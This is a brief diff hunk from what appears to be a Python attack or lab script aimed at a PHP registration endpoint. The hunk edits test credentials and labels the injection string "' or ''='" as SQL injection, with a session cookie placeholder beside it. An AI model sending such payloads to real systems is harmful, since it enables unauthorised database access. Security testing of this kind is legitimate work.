@@ -3,9 +3,9 @@ from urllib.parse import urlparse
 
 # Inputs:
 url = 'https://<ip>/api/register.php'
-usr = 'name'
-passwd = 'Passwd#12'
-inj = "' or ''='"
+usr = 'uname'
+passwd = '#Passwd12'
+inj = "' or ''='" # SQL injection
 cookie = {'PHPSESSID': '<cookie>'}
 
 # Request body
